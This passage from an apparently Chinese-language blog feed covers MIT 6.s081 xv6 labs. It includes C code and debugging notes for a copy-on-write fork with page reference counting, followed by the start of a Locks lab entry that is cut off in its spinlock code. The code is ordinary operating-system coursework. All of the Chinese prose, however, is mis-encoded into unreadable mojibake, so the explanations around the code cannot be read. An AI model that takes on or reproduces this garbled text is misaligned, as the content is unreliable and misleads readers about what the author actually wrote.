å†…éƒ¨åšå‡ºã€‚</li><li><code>kfree</code>Â ä¿æŒå…¶åŸå§‹è¯­ä¹‰ï¼šâ€œ<strong>ç«‹å³ã€æ— æ¡ä»¶åœ°å°†ä¸€ä¸ªé¡µé¢æ”¾å›ç©ºé—²é“¾è¡¨</strong>â€ã€‚å¼•ç”¨è®¡æ•°çš„æ£€æŸ¥å’Œç»´æŠ¤çš„<strong>è´£ä»»å®Œå…¨äº¤ç»™è°ƒç”¨è€…</strong>ã€‚</li></ol><p>å¯¹æ­¤ï¼ŒGemini çš„å·¥ç¨‹å®è·µæ¨èä¸ºä¿®æ”¹ <code>kfree</code> åœ¨å†…éƒ¨æ£€æŸ¥ <code>refcnt</code>ã€‚å¼•ç”¨è®¡æ•°æ˜¯ç‰©ç†å†…å­˜åˆ†é…å™¨ (<code>kalloc.c</code>) çš„å†…éƒ¨å®ç°ç»†èŠ‚ï¼Œä¸Šå±‚æ¨¡å—ä¸åº”è¯¥ã€ä¹Ÿä¸éœ€è¦å…³å¿ƒå®ƒï¼Œè¿™ä½“ç°äº†<strong>å°è£…å’Œä¿¡æ¯éšè—</strong>çš„è®¾è®¡åŸåˆ™ã€‚å…¶æ¬¡è¿™ä¹ˆåšèƒ½æå¤§åœ°å‡å°‘äº†ä»£ç çš„ä¿®æ”¹é‡ï¼Œå¦åˆ™æˆ‘éœ€è¦ä¿®æ”¹ä¸Šå±‚ä¸€ç³»åˆ—è°ƒç”¨è¿™ä¸ªæ¥å£çš„å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kallo.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *pa)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  acquire(&amp;reflock);</span><br><span class="line">  ref = --pprefcnt[n];  <span class="comment">// é€’å‡å¼•ç”¨æ•°</span></span><br><span class="line">  release(&amp;reflock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ref &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    panic(<span class="string">&quot;kfree: physical page&#x27;s refcnt &lt; 0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åªæœ‰å½“å¼•ç”¨ä¸º 0 æ—¶æ‰å®é™…é‡Šæ”¾ç‰©ç†é¡µ</span></span><br><span class="line">  <span class="keyword">if</span>(ref == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">    acquire(&amp;kmem.lock);</span><br><span class="line">    r-&gt;next = kmem.freelist;</span><br><span class="line">    kmem.freelist = r;</span><br><span class="line">    release(&amp;kmem.lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span>(r)&#123;</span><br><span class="line">    n = ((uint64)r-KERNBASE)/PGSIZE;</span><br><span class="line">    acquire(&amp;reflock);</span><br><span class="line">    pprefcnt[n] = <span class="number">1</span>;  <span class="comment">// å½“ä½œç§æœ‰é¡µåˆ†é…ï¼Œå¼•ç”¨çš„è¿›ç¨‹åªæœ‰è‡ªå·±</span></span><br><span class="line">    release(&amp;reflock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ver1-ä¸­é“å´©æ®‚"><a class="markdownIt-Anchor" href="#ver1-ä¸­é“å´©æ®‚"></a> ver1. ä¸­é“å´©æ®‚</h2><p><img src="/2025/07/17/Lab-cow/init_destroyed.png" alt="init_destroyed.png"><br><code>scause=1Â (Instruction access fault)</code> å‘ç”Ÿåœ¨Â <code>init</code>Â è¿›ç¨‹ä¸­ï¼Œå¯ä»¥ç¡®å®šæ˜¯Â <code>init</code>Â è¿›ç¨‹çš„ä»£ç é¡µ (.textÂ æ®µ)Â çš„é¡µè¡¨é¡¹ (PTE) å‡ºäº†é—®é¢˜ï¼Œå¯¼è‡´å®ƒå˜å¾—ä¸å¯æ‰§è¡Œ (PTE_XÂ ä½è¢«æ¸…é™¤)ã€‚åé¢å®¡æŸ¥äº†ä»£ç å‘ç°æ˜¯ä½è¿ç®—å†™é”™äº†ï¼Œå¯¼è‡´ PTE é«˜åœ°å€çš„ PPN è¢«æ“¦é™¤ã€‚</p><p>ä¿®å¤äº†è¿™ä¸ªé—®é¢˜åæˆ‘åˆé‡åˆ°äº†å¾ˆå¤š bugï¼Œæœ‰äº›æ˜¯åƒä¸Šé¢çš„ç¼–ç é—®é¢˜ï¼Œä½†æ˜¯æ›´å¤šçš„é—®é¢˜æŒ‡å‘çš„æ˜¯å¼•ç”¨è®¡æ•°è®¾è®¡çš„ä¸è‰¯ã€‚æˆ‘ä¸€ç›´åœ¨ä¸“æ³¨äºä¿®è¡¥ bugï¼Œå¥‡æ€ªçš„ panic å’Œè°ƒè¯•çš„å¤æ‚è®©æˆ‘æœ€åæ”¾å¼ƒäº†ç¬¬ä¸€æ¬¡å®ç°ï¼Œå†³å®šé‡æ„ä»£ç ã€‚</p><hr><h2 id="ver2-pte-å¼•å…¥-cow-æ‰©å±•ä½"><a class="markdownIt-Anchor" href="#ver2-pte-å¼•å…¥-cow-æ‰©å±•ä½"></a> ver2. PTE å¼•å…¥ COW æ‰©å±•ä½</h2><p>å›åˆ° <code>usertrap()</code> å¤„ç† page fault çš„é—®é¢˜ï¼ˆQ1ï¼‰ï¼šfork ä¼šæŠŠåŸæœ¬æ— è®ºæ˜¯å¦å…·æœ‰å†™æƒé™çš„PTEè®¾ç½®ä¸ºä¸å¯å†™ï¼Œä¸ºäº†æ¢å¤å†™æƒé™ï¼Œæˆ‘ä»¬è¦æ€ä¹ˆâ€œä¿å­˜â€åŸå…ˆçš„ PTE_W æƒé™å‘¢ï¼Ÿ</p><p>è§£å†³æ–¹æ³•äºŒï¼šhint å‘Šè¯‰æˆ‘ä¹ˆå¯ä»¥åˆ©ç”¨ RISC-V PTE çš„ä¿ç•™ä½ï¼ˆRSWï¼‰ï¼Œè®¾ç½® COW page ä½ç”¨æ¥è¡¨æ˜æ˜¯å¦éœ€è¦ copyï¼š</p><ul><li>å¯¹äº<strong>å¯å†™</strong>çš„é¡µé¢ï¼Œæˆ‘ä»¬åœ¨æ¸…é™¤Â PTE_WÂ çš„åŒæ—¶ï¼Œè®¾ç½®Â PTE_CÂ ä½è¡¨ç¤ºå®ƒåŸæœ¬æ˜¯å¯å†™çš„ã€‚</li><li>å¯¹äº<strong>åªè¯»</strong>çš„é¡µé¢ï¼Œæˆ‘ä»¬ä»€ä¹ˆéƒ½ä¸åšï¼Œç›´æ¥å…±äº«ï¼Œå®ƒçš„ PTE ä¸­æ²¡æœ‰Â PTE_CÂ ä½ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/riscv.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_C (1L &lt;&lt; 8) <span class="comment">// cow page</span></span></span><br></pre></td></tr></table></figure><p>å¼•å…¥äº† COW ä½åå¯¹äºçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹çš„é¡µè¡¨æ“ä½œåˆæ·»åŠ äº†è®¸å¤šç»†èŠ‚ï¼Œéœ€è¦æˆ‘ä»¬ä»”ç»†å®¡è®¡ã€‚</p><p>è¿˜æ˜¯å…ˆä¿®æ”¹ <code>fork</code> é¡µè¡¨å¤åˆ¶é€»è¾‘ï¼Œè¿™æ¬¡æˆ‘æ²¡æœ‰æŒ‰æƒ³æ³•æ¥æ–°å†™ä¸€ä¸ª <code>cowcopy</code> ï¼Œè€Œæ˜¯æŒ‰ç…§è¦æ±‚ç›´æ¥ä¿®æ”¹ <code>uvmcopy</code> çš„é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span>&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="type">int</span> failure;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_W)&#123;</span><br><span class="line">      <span class="comment">// originally writeable, set PTE_C to sign</span></span><br><span class="line">      flags = (PTE_FLAGS(*pte) | PTE_C) &amp; ~PTE_W;</span><br><span class="line">      *pte &amp;= ~PTE_W;  <span class="comment">// clear the PTE_W bit of parent</span></span><br><span class="line">      *pte |= PTE_C;   <span class="comment">// set COW bit in parent&#x27;s pte</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// read-only, just share between parent and child</span></span><br><span class="line">      flags = PTE_FLAGS(*pte);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mappages æˆåŠŸåˆ™è¿”å›0</span></span><br><span class="line">    failure = mappages(new, i, PGSIZE, pa, flags);</span><br><span class="line">    refcnt_increment(pa);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(failure)&#123;</span><br><span class="line">      <span class="comment">// no free memory allocated to pagetable page</span></span><br><span class="line">      <span class="comment">// do_free is 1, but actually decrement reference</span></span><br><span class="line">      uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>usertrap</code> é¡µé”™è¯¯é€»è¾‘å¤„ç†ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å¤„ç†å†™å…¥ COW é¡µè¿™ä¸€ä¸ª exceptionï¼Œå¯¹äºå…¶ä»–é¡µé”™è¯¯å’Œå¼‚å¸¸ï¼ŒæŒ‰ç…§åŸæœ¬çš„é€»è¾‘æ‰§è¡Œå°±å¯ä»¥ï¼Œæ‰€ä»¥è¦åœ¨ <code>usertrap</code> æ·»åŠ åˆ¤æ–­é€»è¾‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c: usertrap()</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">pte_t</span>* pte = walk(p-&gt;pagetable, r_stval(), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(r_scause() == <span class="number">0xf</span> &amp;&amp; pte != <span class="number">0</span> &amp;&amp; (*pte &amp; PTE_C) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="comment">// å†™å…¥COWé¡µäº§ç”Ÿçš„ page faultï¼Œæ‰§è¡Œå¤åˆ¶é€»è¾‘</span></span><br><span class="line">    cowfault();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="comment">// éæ³•è¯»/æ‰§è¡Œçš„ page faultï¼Œå·²ç»å…¶ä»–å¼‚å¸¸å¤„ç†é€»è¾‘</span></span><br><span class="line">    <span class="comment">// ... kill process ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>helper function <code>cowfault()</code> å®é™…å¤„ç† COW é¡µé”™è¯¯ï¼Œåœ¨è¿™ä¸ªè®¾è®¡ä¸‹æˆ‘ä»¬å¯ä»¥æ­£ç¡®åœ°å®ç°ä¼˜åŒ–ã€‚æ³¨æ„æœ€åæˆ‘è°ƒç”¨äº† <code>kfree</code> é€’å‡åŸæœ¬ç‰©ç†é¡µçš„å¼•ç”¨è®¡æ•°ï¼Œå…·ä½“æ˜¯å¦çœŸçš„é‡Šæ”¾åˆ™ç”± <code>kfree</code> è‡ªè¡Œåˆ¤æ–­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cowfault</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>;</span></span><br><span class="line">  uint64 faulting_va, pa;</span><br><span class="line">  uint flags, refs;</span><br><span class="line">  <span class="type">pte_t</span>* pte;</span><br><span class="line">  <span class="type">char</span>* mem;</span><br><span class="line"></span><br><span class="line">  p = myproc();</span><br><span class="line">  faulting_va = r_stval();</span><br><span class="line"></span><br><span class="line">  pte = walk(p-&gt;pagetable, faulting_va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(pte == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// no physical page mapped to pte</span></span><br><span class="line">    panic(<span class="string">&quot;cowfault&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pa = PTE2PA(*pte);</span><br><span class="line"></span><br><span class="line">  acquire(&amp;reflock);</span><br><span class="line">  refs = pprefcnt[(pa-KERNBASE)/PGSIZE];</span><br><span class="line">  release(&amp;reflock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// childs have already dereferenced the pa,</span></span><br><span class="line">  <span class="comment">// just change the authority to private and writeable</span></span><br><span class="line">  <span class="keyword">if</span>(refs == <span class="number">1</span>)&#123;   <span class="comment">// &lt;-- cow å¸¦æ¥çš„ä¼˜åŒ–</span></span><br><span class="line">    *pte |= PTE_W;</span><br><span class="line">    *pte &amp;= ~PTE_C;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy the physical page and remap pte</span></span><br><span class="line">  flags = (PTE_FLAGS(*pte) | PTE_W) &amp; ~PTE_C;</span><br><span class="line">  <span class="keyword">if</span>((mem = kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// no free memory, the process should be killedï¼ˆé¢˜ç›®è¦æ±‚ï¼‰</span></span><br><span class="line">    setkilled(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  memmove(mem, (<span class="type">char</span>*)pa, PGSIZE);</span><br><span class="line">  *pte = PA2PTE(mem) | flags;</span><br><span class="line"></span><br><span class="line">  kfree((<span class="type">char</span>*)pa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ç°è¿‡ç¨‹ä¸­ä¾æ—§é‡åˆ°äº†å¾ˆå¤šç»†èŠ‚é—®é¢˜ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸€è®°å½•ä¸‹æ¥ã€‚æœ€åçš„å®ç°é€šè¿‡äº† <code>cowtest</code> ï¼Œä½†æ˜¯æ²¡æœ‰é€šè¿‡ <code>usertests</code> ä¸­çš„ <code>MAXVAplus</code> æµ‹è¯•ã€‚<br><img src="/2025/07/17/Lab-cow/usertests_failed.png" alt="usertests_failed.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c: usertrap()</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">pte_t</span>* pte = walk(p-&gt;pagetable, r_stval(), <span class="number">0</span>); <span class="comment">// &lt;-- é—®é¢˜çš„æ ¹æº</span></span><br><span class="line">    <span class="keyword">if</span>(r_scause() == <span class="number">0xf</span> &amp;&amp; (*pte &amp; PTE_C) != <span class="number">0</span> )&#123;</span><br><span class="line">      cowfault();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// ... kill process ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>usertrap</code> å¤„ç†éæ³•åœ°å€è®¿é—®ï¼ˆè¿™ä¹Ÿæ˜¯ exception ï¼‰æ—¶æ²¡æœ‰åˆ¤æ–­æ˜¯å¦è¶…å‡º <code>MAXVA</code> ï¼Œå¯¼è‡´åé¢çš„ <code>walk()</code> åœ¨å†…æ ¸ä¸­åˆè®¿é—®äº†éæ³•çš„åœ°å€ï¼Œå¯¼è‡´ panicã€‚åœ¨ <code>usertrap</code> ä¸­å¢åŠ è¾¹ç•Œæ¡ä»¶çš„è¿‡æ»¤åé€šè¿‡æµ‹è¯•ğŸ‰<br><img src="/2025/07/17/Lab-cow/all_passed.png" alt="all_passed.png"></p><hr><p>æœ€åæ€»ç»“ä¸€ä¸‹è¿™ä¸ªå®éªŒçš„è¿‡ç¨‹ã€‚è€—æ—¶å¤§æ¦‚10hå·¦å³ï¼Œç›®å‰ä¸ºæ­¢ä¸ªäººæ„Ÿè§‰è¿™ä¸ªå®éªŒæ˜¯æœ€éš¾çš„ï¼Œsuperpage å…¶æ¬¡ã€‚COW fork çš„æƒ³æ³•å¾ˆæœ‰æ„æ€ï¼Œé€šè¿‡ page fault æ¥å®ç° â€œlazy allocationâ€ ï¼Œæœ¬èº«å®ç°æ˜¯ä¸éš¾çš„ï¼Œéš¾åœ¨ä»»åŠ¡è¦æ±‚å®ç°å¼•ç”¨è®¡æ•°çš„ä¼˜åŒ–ï¼Œå¯¹è®¡æ•°ä¸å½“çš„å¢å‡ä¼šå‡ºç°å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œåªèƒ½æ…¢æ…¢ debug æ‰¾åˆ°æ ¹æºï¼ˆç¬¬ä¸€æ¬¡å°è¯•æˆ‘éƒ½æ‰¾ä¸åˆ°ä¸ºä»€ä¹ˆï¼‰ã€‚</p><p>æƒ³ä¸€æƒ³å®é™…ä¸Šå¼•ç”¨è®¡æ•°ä¹Ÿæ˜¯å¿…è¦çš„ï¼Œä¸ç„¶æ— æ³•åˆ¤æ–­ä¸€ä¸ªç‰©ç†é¡µè¢« fork å‡ºçš„å¾ˆå¤šè¿›ç¨‹å…±äº«åï¼Œä»€ä¹ˆæ—¶å€™éœ€è¦é‡Šæ”¾è¿™ä¸ªç‰©ç†é¡µã€‚å¯¹äºæ¯ä¸ªè¿›ç¨‹æ¥è¯´è¿™ä¸ªç‰©ç†é¡µéƒ½ä¸å¯å†™ï¼Œæ¯æ¬¡ page fault éƒ½ä¼šå¤åˆ¶ç‰©ç†é¡µå¹¶ unmap æ˜ å°„ï¼Œé‚£ä¹ˆå½“æœ€åä¸€ä¸ªè¿›ç¨‹è§£é™¤æ˜ å°„åï¼Œè¿™ä¸ªç‰©ç†é¡µå°±æ— æ³•è¿½è¸ªäº†ï¼Œé€ æˆå†…å­˜æ³„éœ²ã€‚æƒ³è¦ç¡®å®šè°æ˜¯â€œæœ€åä¸€ä¸ªâ€ï¼Œç®€å•çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯å®ç°å¯¹ç‰©ç†é¡µçš„å¼•ç”¨è®¡æ•°ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;cow-fork-ä»»åŠ¡èƒŒæ™¯&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cow-fork-ä»»åŠ¡èƒŒæ™¯&quot;&gt;&lt;/a&gt; COW fork ä»»åŠ¡èƒŒæ™¯&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;fork&lt;/code&gt; å‡ºçš„å­è¿›ç¨‹éœ€è¦å¤åˆ¶å…¶çˆ¶è¿›ç¨‹çš„æ•´ä¸ªåœ°å€ç©ºé—´ï¼Œ</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.s081 Lab: Locks</title>
    <link href="http://example.com/2025/07/16/Lab-Locks/"/>
    <id>http://example.com/2025/07/16/Lab-Locks/</id>
    <published>2025-07-16T07:32:21.288Z</published>
    <updated>2025-07-16T07:43:38.426Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Before writing code, make sure to read the following parts from theÂ <a href="https://pdos.csail.mit.edu/6.828/2024/xv6/book-riscv-rev4.pdf">xv6 book</a>Â :</p><blockquote><p>Chapter 6: â€œLockingâ€ and the corresponding code.<br>Section 3.5: â€œCode: Physical memory allocatorâ€<br>Section 8.1 through 8.3: â€œOverviewâ€, â€œBuffer cache layerâ€, and â€œCode: Buffer cacheâ€</p></blockquote></blockquote><blockquote><p>A common symptom of poor parallelism on multi-core machines is high lock contention. Improving parallelism often involves changing both <strong>data structures</strong> and <strong>locking strategies</strong> in order to reduce contention.</p></blockquote><hr><h1 id="rtfscxv6-é”çš„å®ç°"><a class="markdownIt-Anchor" href="#rtfscxv6-é”çš„å®ç°"></a> RTFSCï¼šxv6 é”çš„å®ç°</h1><h2 id="1-è‡ªæ—‹é”-spinlock"><a class="markdownIt-Anchor" href="#1-è‡ªæ—‹é”-spinlock"></a> 1. è‡ªæ—‹é” spinlock</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/spinlock.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> &#123;</span></span><br><span class="line">  uint locked;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *name;        <span class="comment">// Name of lock.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> *<span class="title">cpu</span>;</span>   <span class="comment">// The cpu holding the lock.</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> nts;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„å®šä¹‰è™½ç„¶å« spinlock ï¼Œä½†å…¶å®å°±æ˜¯æœ€åŸºæœ¬çš„äº’æ–¥é”çš„å®šä¹‰ï¼Œæœ€ä¸»è¦çš„å­—æ®µ <code>locked</code> è¡¨ç¤ºè¿™ä¸ªé”æ˜¯å¦è¢« CPU æ‰€æŒæœ‰ã€‚</p><p>æŒ‰ç…§ä¸€èˆ¬çš„é€»è¾‘ï¼Œä¸‹é¢æ˜¯æˆ‘ä»¬åœ¨è½¯ä»¶ä¸Šå¯¹äºè‡ªæ—‹é”çš„åˆ†é…çš„å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">acquire</span><span class="params">(<span class="keyword">struct</span> spinlock* lk)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line"><span class="keyword">if</span>(lk-&gt;locked == <span class="number">0</span>)&#123;</span><br><span class="line">lk-&gt;lock = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºå¤šå¤„ç†å™¨ï¼ˆæˆ–å•å¤„ç†å™¨å¤šçº¿ç¨‹ï¼‰æ¥è¯´ï¼Œä¸Šé¢çš„é€»è¾‘ä¾æ—§å­˜åœ¨é—®é¢˜ï¼Œæˆ‘ä»¬æ— æ³•ä¿è¯ä¸¤ä¸ª CPU ä¸ä¼šåŒæ—¶æ‰§è¡Œåˆ° <code>lk-&gt;locked == 0</code> ï¼Œä»è€Œä½¿å¾—å®ƒä»¬éƒ½è·å¾—äº†è¿™æŠŠé”ã€‚é”æœ¬æ¥å°±æ˜¯ä¸ºäº†å®ç°å…±äº«èµ„æºäº’æ–¥è®¿é—®çš„ï¼Œä½†åœ¨è®¿é—®é”è¿™ä¸ªå…±äº«èµ„æºæ—¶ï¼Œåˆå‡ºç°äº†ç«äº‰æ¡ä»¶ã€‚åŒ»è€…ä¸è‡ªåŒ»ï¼Œè½¯ä»¶ä¸Šæˆ‘ä»¬æ˜¯æ— æ³•è§£å†³è¿™ä¸ªé—®é¢˜çš„ï¼Œåªèƒ½ä¾èµ–äºç¡¬ä»¶ CPU æä¾›çš„åŸå­æ€§ï¼ˆatomicï¼‰æŒ‡ä»¤ï¼Œå¦‚ test_and_setï¼Œswap ç­‰ï¼Œ<strong>ä»è€Œå®ç°ä¸€æ¬¡â€œè¯»å†™æ“ä½œâ€æ˜¯åŸå­çš„ã€‚</strong></p><p>ä¸‹é¢æ˜¯ xv6 åˆ©ç”¨ RISC-V æä¾›çš„åŸå­æ€§ <code>amoswap</code> æŒ‡ä»¤çš„å…·ä½“å®ç°ï¼ˆ<code>__sync_*</code> éƒ½æ˜¯ C åº“å‡½æ•°å¯¹ RISC-V æŒ‡ä»¤çš„ç®€æ´å°è£…ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 